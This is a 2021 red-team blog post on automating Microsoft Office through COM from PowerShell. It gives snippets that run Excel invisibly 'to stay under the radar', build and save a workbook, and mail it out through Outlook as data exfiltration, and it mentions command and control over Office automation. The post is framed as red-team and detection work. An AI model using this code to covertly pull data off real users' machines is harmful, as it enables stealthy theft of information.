<!DOCTYPE html>
<html lang="en-us">
<head prefix="og: http://ogp.me/ns#">
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
  <meta property="og:title" content=" Automating Microsoft Office to Achieve Red Teaming Objectives &middot;  Embrace The Red" />
  
  <meta property="og:site_name" content="Embrace The Red" />
  <meta property="og:url" content="https://embracethered.com/blog/posts/2021/automating-office-to-achieve-redteaming-objectives/" />
  
  
  <meta property="og:type" content="article" />
  
  <meta property="og:article:published_time" content="2021-07-05T13:00:54-07:00" />
  
  <meta property="og:article:tag" content="red" />
  
  <meta property="og:article:tag" content="ttp" />
  
  

  <title>
     Automating Microsoft Office to Achieve Red Teaming Objectives &middot;  Embrace The Red
  </title>

  <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/main.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/font-awesome.min.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/github.css" />
  
  <link rel="stylesheet" href="https://embracethered.com/blog/fonts/cachedfonts.css" type="text/css">
  <link rel="shortcut icon" type="image/x-icon" href="https://embracethered.com/blog/images/favicon.ico" />
  <link rel="apple-touch-icon" type="image/x-icon" href="https://embracethered.com/blog/images/favicon.ico" />
  

  

  
</head>
<body>
    <header class="global-header"  style="background-image:url( /blog/images/bg.png )">
    <section class="header-text">
      <h1><a href="https://embracethered.com/blog/">Embrace The Red</a></h1>
      
      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
        wunderwuzzi&#39;s blog
        <br><div style="color: greenyellow; font-weight:400;">learn the hacks, stop the attacks.</div> 
      </div>
      
      <div class="sns-links hidden-print">
  
  <a href="mailto:security@wunderwuzzi.net">
    <i class="fa fa-envelope"></i>
  </a>
  
  
  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  
  
  <a href="https://youtube.com/@embracethered" target="_blank">
    <i class="fa fa-youtube"></i>
  </a>
  
  
  
  <a href="/blog/index.xml" target="_blank">
    <i class="fa fa-rss"></i>
  </a>
</div>

      
      <a href="https://embracethered.com/blog/" class="btn-header btn-back hidden-xs">
        <i class="fa fa-angle-left" aria-hidden="true"></i>
        &nbsp;Home
      </a>
      
    
      <a href="/blog/index.xml" class="btn-header btn-subscribe hidden-xs">
        <i class="fa fa-rss" aria-hidden="true"></i>
        &nbsp;Subscribe
      </a>
    </section>
  </header>
  <main class="container">


<article>
  <header>
    <h1 class="text-primary">Automating Microsoft Office to Achieve Red Teaming Objectives</h1>
    <div class="post-meta clearfix">
    
      <div class="post-date pull-left">
        Posted on
        <time datetime="2021-07-05T13:00:54-07:00">
          Jul 5, 2021
        </time>
      </div>
    
      <div class="pull-right">
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/red">#red</a></span>
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/ttp">#ttp</a></span>
        
      </div>
    </div>
  </header>
  <section>
    <p>Many Windows applications and services are implemented using an automation infrastructure called <code>Component Object Model (COM)</code>.</p>
<p><code>COM</code> has been around for decades and its useful for programming, sharing of code at binary level, usage from scripting languages, and well, red teaming.</p>
<h2 id="wide-usage-of-component-object-model">Wide Usage of Component Object Model</h2>
<p>Many products are implemented as COM objects, including Microsoft Office. Using <code>PowerShell</code> (or other languages) <code>COM</code> objects can be created to fully automate applications and services.</p>
<p>There is even a <a href="https://github.com/go-ole/go-ole">Golang project to show how to invoke COM</a> from Go, which I&rsquo;m certain real-world malware will pick up on soon.</p>
<h2 id="exploring-the-attack-angle">Exploring the Attack Angle</h2>
<p>If a victim of a cyber attack has the Microsoft Office Suite installed malware can use <code>COM</code> in malicous and subversive ways.</p>
<p>Importantly, this might be something that your Blue Teams is not yet trained to look for, so doing an operation in this space will be useful to build detection and investigation muscles.</p>
<p>Let&rsquo;s explore some scenarios and code examples in this blog post.</p>
<h2 id="automating-microsoft-excel">Automating Microsoft Excel</h2>
<p>For instance, it&rsquo;s quite simple to automate the popular <code>Excel</code> application via <code>PowerShell</code>. We can use the <code>New-Object -com</code> command to create the Excel Application, and subsequently interact with the returned object.</p>
<pre tabindex="0"><code>PS C:\&gt; $excel = New-Object -com Excel.Application
PS C:\&gt; $excel.Visible = $true
</code></pre><p>To stay under the radar and hide the user interface, use the default of <code>Visible = $false</code>.</p>
<h3 id="editing-the-excel-document">Editing the Excel document</h3>
<p>As the next step we can add a <code>Workbook</code> and write some data to a specific <code>Cell</code>.</p>
<pre tabindex="0"><code>PS C:\&gt; $workbook = $excel.Workbooks().Add()
PS C:\&gt; $cell = $workbook.ActiveSheet.Cells(1,1)
PS C:\&gt; $cell.Value = &#34;Here goes the secret message!&#34;
PS C:\&gt; $workbook.Password = &#34;Test&#34;
</code></pre><p>This is how the result looks like:</p>
<p><img src="/blog/images/2021/excel.PNG" alt="Using Excel Automation"></p>
<p>The above images shows the created Excel document. <em>Remember that we set <code>Visible=$true</code> - this to demo what is possible, during an attack an adversary would not show the user interface.</em></p>
<h3 id="saving-the-document">Saving the document</h3>
<p>Using the <code>SaveAs</code> function the document can be stored.</p>
<pre tabindex="0"><code>PS C:\&gt; $workbook.SaveAs(&#34;EmbraceTheRed&#34;)
</code></pre><h3 id="closing-the-document">Closing the document</h3>
<p>Finally, Excel can be closed.</p>
<pre tabindex="0"><code>PS C:\&gt; $workbook.Close()
PS C:\&gt; $excel.Quit()
</code></pre><h3 id="data-exfiltration---emailing-the-document">Data Exfiltration - Emailing the document</h3>
<p>As said all most of Office is implemented using COM interfaces, so we can automate <code>Outlook</code> as well.</p>
<p>In order to send the created <code>Excel</code> document out of the network, an adversary could use <code>Outlook</code> for instance.</p>
<pre tabindex="0"><code>$to = &#34;&#34;
$subject = &#34;Secret Excel Document&#34;
$content = &#34;Important message attached.&#34;

$outlook = New-Object -com Outlook.Application
$mail = $outlook.CreateItem(0)
$mail.Attachments.Add(&#34;EmbraceTheRed&#34;)
$mail.subject = $subject
$mail.To = $to
$mail.HTMLBody = $content

$mail.Send()
</code></pre><p>Note, this will use the current users Outlook profile.</p>
<p>Alternatively you could just use the Excel built in <code>SendMail</code> API which is <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.workbook.sendmail">documented here</a>.</p>
<h2 id="command--control-via-office-automation">Command &amp; Control via Office Automation</h2>
<p>Using these COM automation techniques its possible to use off the shelve applications installed on a compromised machine to exfiltrate data, but also to establish an entire C2 infrastructure and message communication.</p>
<p>The MITRE ATT&amp;CK matrix also <a href="https://attack.mitre.org/techniques/T1559/001/">highlights a couple of real world attacks</a> that have used COM.</p>
<h2 id="conclusion">Conclusion</h2>
<p>COM Automation and scripting langauges are a powerful way for malware to perform operations, including data exfiltration. It uses existing applications already present on a compromised host which can make malicious usage difficult to detect. Hence it&rsquo;s important to monitor for untypically COM usage.</p>
<p><strong>In my opinion these TTPs are a good candidates for a purple team operations.</strong></p>
<p>Cheers,
<a href="https://twitter.com/wunderwuzzi23">@wunderwuzzi23</a></p>
<p>If you found this interesting check out my book about <a href="https://www.amazon.com/gp/product/1838828869/ref=as_li_tl?ie=UTF8&amp;tag=wunderwuzzi-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=1838828869&amp;linkId=07bfd6b729fbc2b2904160e0e16c337f">Cybersecurity Attacks - Red Team Strategies</a>.</p>
<h2 id="references">References</h2>
<ol>
<li><a href="https://github.com/go-ole/go-ole">Golang projects that show how to use COM from Go</a>.</li>
<li><a href="https://docs.microsoft.com/en-us/office/vba/api/excel.workbook.sendmail">SendMail Excel API</a></li>
<li><a href="https://attack.mitre.org/techniques/T1559/001/">COM and MITRE Attack</a></li>
</ol>

  </section>
  <footer>
    
    
    
    <footer></footer><hr/>
    
    <ul class="pager">
      
      <li class="next"><a href="https://embracethered.com/blog/posts/2021/silversearcher-ag/">Newer <span aria-hidden="true">&rarr;</span></a></li>
      
      
      <li class="author-contact">
        <a href="mailto:security@wunderwuzzi.net">
          <i class="fa fa-envelope-o" aria-hidden="true"></i>
          &nbsp;Contact me
        </a>
     </li>

      
      
      <li class="previous"><a href="https://embracethered.com/blog/posts/2021/airtag-hacks/"><span aria-hidden="true">&larr;</span> Older</a></li>
      
    </ul>
  </footer>
</article>
</main>
  <footer class="container global-footer">
    <div class="copyright-note pull-left">
     
     (c) WUNDERWUZZI 2018-2025
     <div class="sns-links hidden-print">
  
  <a href="mailto:security@wunderwuzzi.net">
    <i class="fa fa-envelope"></i>
  </a>
  
  
  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  
  
  <a href="https://youtube.com/@embracethered" target="_blank">
    <i class="fa fa-youtube"></i>
  </a>
  
  
  
  <a href="/blog/index.xml" target="_blank">
    <i class="fa fa-rss"></i>
  </a>
</div>
 
     <div style="font-size:small;font-style: italic;color:crimson">
    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. 
    </div>
    </div>
</footer>
  <script src="https://embracethered.com/blog/js/highlight.pack.js"></script>
  <script>
    hljs.initHighlightingOnLoad();
  </script>
  
  



<script type="text/javascript">
  var _paq = window._paq || [];
  _paq.push(["disableCookies"]);
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u="//wuzzi.net/anamato/inc/";
    _paq.push(['setTrackerUrl', u+'rts.php']);
    _paq.push(['setSiteId', '1']);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
  })();
</script>
<img src="https://wuzzi.net/anamato/inc/rts.php?idsite=1&amp;rec=1" style="border:0;" alt="" />
  
</body>
</html>

